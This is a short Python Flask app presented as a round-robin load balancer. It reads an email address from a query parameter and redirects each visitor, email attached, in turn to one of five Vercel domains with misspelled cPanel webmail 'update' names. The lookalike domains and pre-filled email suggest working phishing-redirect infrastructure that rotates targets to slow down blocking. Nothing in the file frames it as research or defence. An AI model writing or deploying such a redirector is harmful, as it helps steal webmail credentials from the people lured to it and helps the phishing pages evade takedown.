from flask import Flask, redirect, request
import os

app = Flask(__name__)

DOMAINS = [
    'https://cpane-llwebmail-update-3-6-2-zip.vercel.app',
    'https://cpanellupdate-2-3-1-zip-vigilant-gi.vercel.app',
    'https://cpane-llwebmail-update-3-6-2-zip-sable.vercel.app',
    'https://webmail-cpanel-update-2-3-1-zip.vercel.app',
    'https://cpane-lwebmaiil-update-5-3-2-zip.vercel.app'
]

# Initialize counter
current_index = 0

@app.route('/')
def round_robin_balancer():
    global current_index
    
    email = request.args.get('web', '')
    
    # Basic email validation
    if not email or '@' not in email or '.' not in email:
        return "Invalid email. Use: ?web=email@example.com", 400
    
    # Get next domain in round-robin sequence
    target_domain = DOMAINS[current_index]
    
    # Increment index for next request
    current_index = (current_index + 1) % len(DOMAINS)
    
    # Construct target URL
    target_url = f"{target_domain}/?web={email}"
    
    # Instant redirect
    return redirect(target_url, code=302)

if __name__ == '__main__':
    app.run(debug=True)
